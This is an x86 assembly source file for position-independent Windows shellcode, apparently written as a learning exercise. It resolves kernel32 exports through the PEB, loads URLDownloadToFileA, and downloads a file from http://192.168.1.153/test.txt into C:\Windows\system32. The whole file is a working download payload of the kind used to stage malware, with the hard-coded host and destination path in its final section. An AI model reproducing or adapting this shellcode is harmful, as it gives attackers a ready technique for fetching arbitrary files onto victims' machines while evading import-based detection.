;portableApiUrlDl.asm
[SECTION .text]

global _start


_start:
		; Find Kernel32.dll
        xor ecx,ecx						; ECX = 0
		mov eax,[fs:ecx+0x30]			; EAX = PEB
		mov eax,[eax+0x0C]				; EAX = PEB->ldr
		mov esi,[eax+0x14]				; ESI = PEB->Ldr.InMemOrder
		lodsd							; EAX = Second module
		xchg eax,esi					; EAX = ESI, ESI = EAX
		lodsd							; EAX = Third (kernel32)
		mov ebx,[eax+0x10]				; EBX = Base address
		mov edx,[ebx+0x3c]				; EDX = DOS->e_lfanew
		add edx,ebx						; EDX = PE Header
		mov edx,[edx+0x78]				; EDX = Offset export table
		add edx,ebx						; EDX = Export table
		mov esi,[edx+0x20]				; ESI = Offset names table
		add esi,ebx						; ESI = Names table
		xor ecx,ecx						; ECX = 0
		
		
		
		; Find GetProcAddress
		inc ecx							; Loop for each function
		lodsd
		add eax,ebx						; Loop untill function name
		
		cmp dword [eax],0x50746547		; GetP
		jnz $-0xa
		cmp dword [eax+0x4],0x41636f72	; rocA
		jnz $-0x13
		cmp dword [eax+0x8],0x65726464	; ddre
		jnz $-0x1c
		
		mov esi,[edx+0x24]				; ESI = Offset ordinals
		add esi,ebx						; ESI = Ordinals table
		mov cx,[esi+ecx*2]				; CX = Number of function
		dec ecx
		mov esi,[edx+0x1c]				; ESI = Offset address table
		add esi,ebx						; ESI = Address table
		
		mov edx,[esi+ecx*4]				; EDX = Pointer(offset)
		add edx,ebx						; EDX = GetProcAddress
		
		
		
		; Find GetModuleHandleW
		xor ecx,ecx						; ECX = 0
		push ecx						; 0
		push ebx						; Kernel32 base address
		push edx						; GetProcAddress
		push ecx						; 0
		push dword 0x41656c64			; dleA
		push dword 0x6e614865			; eHan
		push dword 0x6c75646f			; odul
		push dword 0x4d746547			; GetM
		push esp						; "GetModuleHandleA"
		push ebx						; Kernel32 base address
		call edx						; GetProcAddress("GetModuleHandleA")
		
		
		
		; get a Dll Handle (urlmon.dll)
		add esp,byte +0x10				; pop "GetModuleHandleA"
		pop ecx							; ECX = 0
		push eax						; EAX = GetModuleHandleA
		push ecx
		mov ecx,0x6c6c					; ll
		push ecx
		push dword 0x642e6e6f			; on.d
		push dword 0x6d6c7275			; urlm
		push esp						; "urlmon.dll"
		call eax						; GetModuleHandleA("uurlmon.dll")
		
		
		
		; Get Function from DLL (URLDownloadToFileA)
		add esp,byte +0xc				; Clean stack
		pop ecx
		mov edx,[esp+0x4]				; EDX = GetProcAddress
		push ecx
		mov ecx,0x4165					; eA
		push ecx
		xor ecx,ecx						; ECX = 0
		push dword 0x6c69466f			; oFil
		push dword 0x5464616f			; oadT
		push dword 0x6c6e776f			; ownl
		push dword 0x444c5255			; URLD
		push esp						; "URLDownloadToFileA"
		push eax						; urlmon base address
		call edx						; GetProc(URLDown)
		
		
		
		; Call URLDownloadToFileA
		add esp,byte +0x14				; Clean stack
		pop ecx
		push eax                        ; EAX = URLDownloadToFileA
		push ecx
		mov ecx, 0x74					; t
		push ecx
		push dword 0x78742e74			; t.tx
		push dword 0x7365742f			; /tes
		push dword 0x3335312e			; .153
		push dword 0x322e3836			; 68.2
		push dword 0x312e3239			; 92.1
		push dword 0x312f2f3a			; ://1
		push dword 0x70747468			; http
		mov edx,esp
		xor ecx,ecx
		push ecx		
		mov ecx,0x7478742e				; .txt
		push ecx
		push dword 0x74736574			; test
		push dword 0x5c32336d			; m32\ 
		push dword 0x65747379			; yste
		push dword 0x735c7377			; ws\s
		push dword 0x6f646e69			; indo
		push dword 0x575c3a43			; C:\W
		mov ebx,esp
		xor ecx,ecx
		push ecx
		push ecx
		push ecx
		push ebx
		push edx
		push ecx
		call eax						; urlDown
		
		
		
		; return
		add esp,byte +0x5c				; Clean stack
		ret


